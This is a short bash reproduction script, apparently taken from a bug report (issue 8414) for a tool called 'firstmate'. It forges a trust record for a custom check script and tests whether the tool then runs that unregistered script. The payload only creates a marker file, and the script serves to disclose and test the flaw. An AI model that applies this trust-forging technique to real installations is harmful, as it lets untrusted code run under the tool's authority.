#!/usr/bin/env bash
# Verbatim reproduction from issue 8414.
set -u
ROOT=${1:?firstmate checkout}
WORK=$(mktemp -d); trap 'rm -rf -- "$WORK"' EXIT
STATE="$WORK/state"; mkdir -p "$STATE"; MARK="$WORK/ran"
printf '#!/usr/bin/env bash\ntouch %q\n' "$MARK" > "$STATE/evil.check.sh"
chmod 0700 "$STATE/evil.check.sh"
hash=$(sha256sum "$STATE/evil.check.sh" | awk '{print $1}')
printf 'fm-custom-check-v1\n%s\n' "$hash" > "$STATE/evil.check-trust"
chmod 0600 "$STATE/evil.check-trust"
. "$ROOT/bin/fm-pr-lib.sh"; . "$ROOT/bin/fm-check-lib.sh"
fm_custom_check_registered "$STATE" evil && echo "registered: yes (forged trust record accepted)"
fm_custom_check_snapshot_prepare "$STATE" evil && bash "$FM_CUSTOM_CHECK_SNAPSHOT"
fm_custom_check_snapshot_cleanup
[ -e "$MARK" ] && echo "RESULT: forged check executed" || echo "RESULT: forged check refused"
